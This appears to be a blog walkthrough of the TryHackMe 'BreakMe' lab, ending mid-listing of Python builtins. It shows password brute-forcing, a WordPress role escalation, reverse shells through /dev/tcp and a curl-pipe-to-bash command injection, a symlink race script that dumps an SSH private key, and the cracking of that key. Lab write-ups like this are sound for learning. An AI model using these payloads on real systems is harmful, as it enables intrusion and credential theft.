---
layout: post
title: "THM-BreakMe"
description: Walkthrough writeup of THM-BreakMe
---

<p>In BreakMe, we exploited a WordPress vulnerability, leveraged a TOCTOU race condition for lateral privilege escalation, and bypassed a Python sandbox to ultimately achieve root access.</p>

<h2>Introduction</h2>

<p>In this post, I will demonstrate the exploitation of a medium machine called "Breakme" on Tryhackme. Overall, it was an easy box except the last part where you have to exploit a RACE condition, which I had never heard of. The Python sandbox escape was also quite hard as I have little Python experience. Overall, It was a good learning experience.</p>

<h2> Step 1: running an Nmap scan on the target</h2>
<pre>
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV -sC 10.10.54.30
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 11:21 EDT
Nmap scan report for 10.10.54.30
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.55 seconds
</pre>

<p>This scan revealed that we have an SSH service running as well as a webserver on port 22 and 80, respectively.</p>

<h2>Step 2: Enumerating the webserver</h2>
<p>Surfing to the IP address, I was greeted with the default apache server page:</p>
<img src="/images/breakme/breakme_apache_default.webp" alt="default apache page" class="postImage">
<p>After some directory bruteforcing using ffuf, I found outt that there is a Wordpress site:</p>
<pre>
──(kali㉿kali)-[/opt]
└─$ wpscan --url http://10.10.54.30/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames bob                                                            
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.54.30/wordpress/ [10.10.54.30]
[+] Started: Tue Aug 19 12:19:31 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.54.30/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.54.30/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.54.30/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.54.30/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://10.10.54.30/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.10.54.30/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://10.10.54.30/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://10.10.54.30/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.54.30/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.10.54.30/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-08-16T11:12:00.000Z
 | [!] The version is out of date, the latest version is 5.5.49
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.54.30/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=======================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - bob / soccer                                                                                                                                              
Trying bob / anthony Time: 00:00:01 <                                                                                          > (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bob, Password: soccer

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug 19 12:19:37 2025
[+] Requests Done: 203
[+] Cached Requests: 5
[+] Data Sent: 57.78 KB
[+] Data Received: 484.285 KB
[+] Memory used: 278.191 MB
[+] Elapsed time: 00:00:06
</pre>

<h2>Step 3: gaining access</h2>
<p>This scan revealed a lot. First, Two users were found: bob & admin. Of those, It was able to bruteforce the password of Bob. Last, the script also noted that the wp-data plugin was out of date. With these newly obtained credentials, I decided to login as Bob to the Wordpress panel:</p>
<img src="/images/breakme/breakme_no_admin_options.webp" alt="Wordpress login as bob" class="postImage">
<p>Unfortunately, Bob is not an admin which can be seen by the lack of options the Wordpress panel. As stated before, WpScan revealed that the "WP-DATA-ACCESS" plugin was out of date. With some Googling, I discovered a privilege escalation vulnerability in this old version of "WP-DATA-ACCESS". The exploit is linked here: <span class="url"><a href="https://github.com/thomas-osgood/cve-2023-1874">WP-DATA-ACCESS privilege escalation</a></span>.</p>
<p>Instead of just running the Python script, I looked at the code to understand what it was doing and exploited it myself using Burpsuite. It appears we just need to update our profile, Intercept the request using Burpsuite and add the following to the request parameters: "wpda_role[] = 'Administrator'". In Burpsuite, it looks like this: </p>
<img src="/images/breakme/breakme_escalate_privileges.webp" alt="Burpsuite payload privilege escalation" class="postImage">
<p>Refreshing the Wordpress panel yields us the user bob escalated to admin!</p>
<img src="/images/breakme/breakme_getting_admin_wordpress_overview.webp" alt="Wordpress panel with admin privileges" class="postImage">
<p>Now that we have admin privileges, a reverse shell is easily obtained. For this, grab a malicious reverse shell payload plugin from github (<span class="url"><a href="https://github.com/thomas-osgood/cve-2023-1874">Reverse shell plugin Wordpress</a></span>), start a listener on the attacking the device and install the malicious plugin through the Wordpress admin panel. </p>
<p>Specifically, these steps can be followed:</p>
<pre>
nc -lnvp 9000
</pre>
<p>Navigate to the cloned directory and run the following:</p>
<pre>
python reversePress.py HOST_IP -p 1234 -l
</pre>
<p>A ZIP file should have been created in your working directory (the python script may have an error at the end, but it should still work). This needs to be uploaded and installed through the Wordpress admin page. Once installed, navigate to "https://&lt;target_domain&gt;/wp-content/plugins/reverse_shell_plugin/reverse_shell.php" in the browser. This should execute the payload and spawn a reverse shell:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.9.235.177] from (UNKNOWN) [10.10.49.132] 33522
</pre>

<h2>Step 4: Lateral privilege escalation to john</h2>
<p>Doing some exploring, I found some credentials to MariaDB database in a PHP configuration file. However, dumping the database and its stored credentials did not reval anything new. Then, I decided to run the following command and discovered something running on port 9999. Could it be an internal webserver?</p>
<pre>
www-data@Breakme:/var/www/html/wordpress/wp-content/plugins/reverse_shell_plugin$ ss -tulnp
Netid            State             Recv-Q            Send-Q                         Local Address:Port                         Peer Address:Port            Process            
udp              UNCONN            0                 0                                    0.0.0.0:68                                0.0.0.0:*                                  
tcp              LISTEN            0                 80                                 127.0.0.1:3306                              0.0.0.0:*                                  
tcp              LISTEN            0                 4096                               127.0.0.1:9999                              0.0.0.0:*                                  
tcp              LISTEN            0                 128                                  0.0.0.0:22                                0.0.0.0:*                                  
tcp              LISTEN            0                 511                                        *:80                                      *:*                                  
tcp              LISTEN            0                 128                                     [::]:22                                   [::]:*  
</pre>
<p>Further exploration revealed that it was indeed a webserver and that the process was running as its owner john. Therefore, I decided to forward the service to my local machine. As I did not have any ssh credentials, I was unsure how this could be done. After some Googling, I found out this could be achieved using "Chisel" which can be installed through apt on kali.</p>
<p>First, navigate to the directory where the Chisel binary is stored and spin up a Python server:</p>
<pre>
python3 -m http.server 4444
</pre>
<p>On the victim machine, download the chisel binary using wget or curl:</p>
<pre>
wget &lt;IP-Address&gt;&lt;PORT&gt;/chisel
</pre>
<p>On the target run:</p>
<pre>
./chisel server --port 1234 --reverse
</pre>
<p>On the attacking machine, run:</p>
<pre>
./chisel client &lt;YOUR_IP&gt;:1234 R:9999:127.0.0.1:9999
</pre>
<p>Now, open a browser and surf to localhost:9999 to view the contents of the webserver:</p>
<img src="/images/breakme/breakme_internal_webserver.webp" alt="Internal webserver initial page" class="postImage">
<p>We are greeted with 3 input fields. Initial exploration revealed that the first input field performs a ping to the requested Ip address. The second input field looks for a user and the third for a file. It's quite obvious here that we probably have some kind of command injection vulnerability. In the first input field, entering anything other than a valid IP address fails. Therefore, it seemed that this input field is not all that valuable to us. The second input field seemed more interesting. To verify whether command injection was possible, I tested some special characters. Most of them where filtered except: $|{}?. Using this knowledge, I started crafting an initial payload to test whether there was command injection:</p>
<pre>
|ping${IFS}10.9.235.177
</pre>
<img src="/images/breakme/breakme_payload.webp" alt="burpsuite payload privilege escalation" class="postImage">
<p>The payload uses the "|" to breakout of the current command that is running. As spaces are also filtered, I used the internal field separator (${IFS}) which defaults to a space in linux.</p>
<p>Success, Command injection is achieved:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:25:44.293954 IP 10.10.66.31 > 10.9.235.177: ICMP echo request, id 62095, seq 1, length 64
09:25:44.293963 IP 10.9.235.177 > 10.10.66.31: ICMP echo reply, id 62095, seq 1, length 64
09:25:45.294790 IP 10.10.66.31 > 10.9.235.177: ICMP echo request, id 62095, seq 2, length 64
09:25:45.294804 IP 10.9.235.177 > 10.10.66.31: ICMP echo reply, id 62095, seq 2, length 64
09:25:46.296296 IP 10.10.66.31 > 10.9.235.177: ICMP echo request, id 62095, seq 3, length 64
09:25:46.296312 IP 10.9.235.177 > 10.10.66.31: ICMP echo reply, id 62095, seq 3, length 64
09:25:47.297019 IP 10.10.66.31 > 10.9.235.177: ICMP echo request, id 62095, seq 4, length 64
</pre>
<p>Knowing that command execution is possible, I crafted a reverse shell payload to gain a shell as John:</p>
<pre>
#!/bin/bash
bash -i >& /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&1
</pre>
<p>Next, launch a python webserver in the same directory of the reverse shell payload and start a netcat listener:</p>
<pre>
python3 -m http.server 7777
nc -lnvp &lt;PORT&gt;
</pre>
<p>Finally, upload the reverse shell to the attacking machine using curl and execute:</p>
<pre>
|curl${IFS}&lt;YOUR_IP&gt;:&lt;PORT&gt;/shell.sh|bash
</pre>
<img src="/images/breakme/breakme_payload_rev_shell.webp" alt="burpsuite reverse shell payload" class="postImage">
<p>If everything went right, a shell as john should have spawned:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1456
listening on [any] 1456 ...
connect to [10.9.235.177] from (UNKNOWN) [10.10.66.31] 44564
bash: cannot set terminal process group (538): Inappropriate ioctl for device
bash: no job control in this shell
john@Breakme:~/internal$   
</pre>

<h2>Step 5: Lateral privilege escalation to Youcef</h2>
<p>Exploring the directory of another user: Youcef, we find a readfile binary which has suid set essentially meaning we can execute it as Youcef. I copied the binary to my machine for analysis in Ghidra.</p>
<pre>
john@Breakme:/home/youcef$ ls -al
total 52
drwxr-x--- 4 youcef john    4096 Aug  3  2023 .
drwxr-xr-x 5 root   root    4096 Feb  3  2024 ..
lrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout
-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc
drwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .local
-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
drwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh
</pre>
<p>The main function of the binary looked like this:</p>
<pre>
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  __uid_t _Var2;
  undefined8 uVar3;
  ssize_t sVar4;
  stat local_4b8;
  undefined1 local_428 [1024];
  int local_28;
  int local_24;
  int local_20;
  uint local_1c;
  char *local_18;
  char *local_10;
  
  if (param_1 == 2) {
    iVar1 = access(*(char **)(param_2 + 8),0);
    if (iVar1 == 0) {
      _Var2 = getuid();
      if (_Var2 == 0x3ea) {
        local_10 = strstr(*(char **)(param_2 + 8),"flag");
        local_18 = strstr(*(char **)(param_2 + 8),"id_rsa");
        lstat(*(char **)(param_2 + 8),&local_4b8);
        local_1c = (uint)((local_4b8.st_mode & 0xf000) == 0xa000);
        local_20 = access(*(char **)(param_2 + 8),4);
        usleep(0);
        if ((((local_10 == (char *)0x0) && (local_1c == 0)) && (local_20 != -1)) &&
           (local_18 == (char *)0x0)) {
          puts("I guess you won!\n");
          local_24 = open(*(char **)(param_2 + 8),0);
          if (local_24 < 0) {
                    /* WARNING: Subroutine does not return */
            __assert_fail("fd >= 0 && \"Failed to open the file\"","readfile.c",0x26,"main");
          }
          do {
            sVar4 = read(local_24,local_428,0x400);
            local_28 = (int)sVar4;
            if (local_28 < 1) break;
            sVar4 = write(1,local_428,(long)local_28);
          } while (0 < sVar4);
          uVar3 = 0;
        }
        else {
          puts("Nice try!");
          uVar3 = 1;
        }
      }
      else {
        puts("You can\'t run this program");
        uVar3 = 1;
      }
    }
    else {
      puts("File Not Found");
      uVar3 = 1;
    }
  }
  else {
    puts("Usage: ./readfile &lt;FILE&gt;");
    uVar3 = 1;
  }
  return uVar3;
}
</pre>
<p>As I have little to no experience with C (I learned Java). I asked chatGPT to help me make out what the function actually did. I will go over the most important parts of the code:</p>
<p>The first if statement checks for exactly 1 argument:</p>
<pre>
if (param_1 == 2)
</pre>
<p>The following piece of code checks the uid, essentially meaning we can only run this program as john (john has uid 1002). Otherwise the program quits:</p>
<pre>
 _Var2 = getuid();
      if (_Var2 == 0x3ea) {
      }
      else {
        puts("You can\'t run this program");
        uVar3 = 1;
      }
</pre>
<p>Next, it checks whether the strings "flag" or "id_rsa" are present within the supplied argument. This prohibits the reading of the ssh keys of youcef as well as capturing any flags.</p>
<pre>
local_10 = strstr(argv[1], "flag");
local_18 = strstr(argv[1], "id_rsa");
</pre>

<p>Finally, before reading the file, the program runs a few checks. It checks the metadata, whether or not it's a symbolic link and whether the file is readable. If the file is a symlink or not readable than it gives an error/message: </p>
<pre>
local_10 = strstr(*(char **)(param_2 + 8),"flag");
local_18 = strstr(*(char **)(param_2 + 8),"id_rsa");
lstat(*(char **)(param_2 + 8),&local_4b8);
local_1c = (uint)((local_4b8.st_mode & 0xf000) == 0xa000);
local_20 = access(*(char **)(param_2 + 8),4);
usleep(0);
if ((((local_10 == (char *)0x0) && (local_1c == 0)) && (local_20 != -1)) &&
    (local_18 == (char *)0x0)) {
    puts("I guess you won!\n");
</pre>
<p>After the initial checks, it finally opens the file and reads its contents</p>
<pre>
do {
    sVar4 = read(local_24, local_428, 0x400); // read up to 1024 bytes
    local_28 = (int)sVar4;
    if (local_28 < 1) break;                  // EOF or read error
    sVar4 = write(1, local_428, (long)local_28); // write to stdout (fd=1)
} while (0 < sVar4);
</pre>
<p>Here, I got stuck and had no idea on how this binary could be exploited to escalate to the "youcef" user. Thus, I consulted a writeup. Apparently, this binary is vulnerable to something that is called a "RACE" condition. More specifically, a TOCTOU RACE condition (Time-of-check to Time-of-use).This happens when a program first checks a file and after the check it does something with the file (in this case reading its contents). This is vulnerable as there is a small gap between the checks and the reading of the file. During this gap, we can replace/change the file and thereby tricking the program to open another file which would otherwise not pass the initial checks that are happening at the beginning of the code. In practice, this can be exploited as follows: </p>
<pre>
#!/bin/bash
while true; do
ln -sf /home/youcef/.ssh/id_rsa temp
rm temp
touch temp
done &
for i in {1..30;}
    do /home/youcef/readfile temp
done
</pre>

<p>After a few attempts, this script should return the ssh private key:</p>
<pre>
john@Breakme:~$ ./exploit.sh
./exploit.sh
File Not Found
File Not Found
File Not Found
I guess you won!

File Not Found
File Not Found
readfile: readfile.c:38: main: Assertion `fd >= 0 && "Failed to open the file"' failed.
./exploit.sh: line 7: 503560 Aborted                 /home/youcef/readfile temp
I guess you won!

-----BEGIN OPENSSH PRIVATE KEY-----
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
TabCXd2Ji/Y7UvM=
-----END OPENSSH PRIVATE KEY-----
I guess you won!
</pre>

<p>Unfortunately, when attempting to establish an SSH connection to the machine using Youcef’s private SSH key, we are prompted to provide a passphrase. To proceed, we will need to recover this passphrase by decrypting it with John the Ripper.</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ ssh -i key youcef@10.10.66.31
The authenticity of host '10.10.66.31 (10.10.66.31)' can't be established.
ED25519 key fingerprint is SHA256:7C+7KD5sXHHAuUddL4pe+CYqXj7LEWGqlWATdS4wRw8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.66.31' (ED25519) to the list of known hosts.
Enter passphrase for key 'key': 
</pre>

<p>First, pass the private key to ssh2john and store the hash in a file:</p>
<pre>
ssh2john key > hashkey
</pre>
<p>Second, Let John do its magic by typing the following command:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ john hashkey                                                                                                                                                               
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
a123456          (key)     
1g 0:00:01:04 DONE 2/3 (2025-08-24 11:12) 0.01547g/s 48.43p/s 48.43c/s 48.43C/s amigas..karla
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</pre>
<p>Now, we can finally login as youcef:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ ssh -i key youcef@10.10.66.31                                                                                                                                              
Enter passphrase for key 'key': 
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 21 07:55:16 2024 from 192.168.56.1
youcef@Breakme:~$ 
</pre>

<h2>Step 6:  privilege escalation to root</h2>
<p>It appears that Youcef is allowed to run a Python jail as sudo. Thereby providing a vector for privilege escalation to root:</p>
<pre>
youcef@Breakme:~$ sudo -l
Matching Defaults entries for youcef on breakme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
</pre>
<p>Running it as sudo opens the Python jail:</p>
<pre>
youcef@Breakme:~$ sudo python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever  
  Or will you BreakMe  
>> 
</pre>
<p>I first checked which built in object that are available in the environment:</p>
<pre>
&#123;'__name__': 'builtins',
 '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.",
 '__package__': '',
 '__loader__': &amp;lt;class '_frozen_importlib.BuiltinImporter'&amp;gt;,
 '__spec__': ModuleSpec(name='builtins', loader=&amp;lt;class '_frozen_importlib.BuiltinImporter'&amp;gt;, origin='built-in'),
 '__build_class__': &amp;lt;built-in function __build_class__&amp;gt;,
 '__import__': &amp;lt;built-in function __import__&amp;gt;,
 'abs': &amp;lt;built-in function abs&amp;gt;,
 'all': &amp;lt;built-in function all&amp;gt;,
 'any': &amp;lt;built-in function any&amp;gt;,
 'ascii': &amp;lt;built-in function ascii&amp;gt;,
 'bin': &amp;lt;built-in function bin&amp;gt;,
 'breakpoint': &amp;lt;built-in function breakpoint&amp;gt;,
 'callable': &amp;lt;built-in function callable&amp;gt;,
 'chr': &amp;lt;built-in function chr&amp;gt;,
 'compile': &amp;lt;built-in function compile&amp;gt;,
 'delattr': &amp;lt;built-in function delattr&amp;gt;,
 'dir': &amp;lt;built-in function dir&amp;gt;,
 'divmod': &amp;lt;built-in function divmod&amp;gt;,
 'eval': &amp;lt;built-in function eval&amp;gt;,
 'exec': &amp;lt;built-in function exec&amp;gt;,
 'format': &amp;lt;built-in function format&amp;gt;,
 'getattr': &amp;lt;built-in function getattr&amp;gt;,
 'globals': &amp;lt;built-in function globals&amp;gt;,
 'hasattr': &amp;lt;built-in function hasattr&amp;gt;,
 'hash': &amp;lt;built-in function hash&amp;gt;,
 'hex': &amp;lt;built-in function hex&amp;gt;,
 'id': &amp;lt;built-in function id&amp;gt;,
 'input': &amp;lt;built-in function input&amp;gt;,
 'isinstance': &amp;lt;built-in function isinstance&amp;gt;,
 'issubclass': &amp;lt;built-in function issubclass&amp;gt;,
 'iter': &amp;lt;built-in function iter&amp;gt;,
 'len': &amp;lt;built-in function len&amp;gt;,
 'locals': &amp;lt;built-in function locals&amp;gt;,
 'max': &amp;lt;built-in function max&amp;gt;,
 'min': &amp;lt;built-in function min&amp;gt;,
 'next': &amp;lt;built-in function next&amp;gt;,
 'oct': &amp;lt;built-in function oct&amp;gt;,
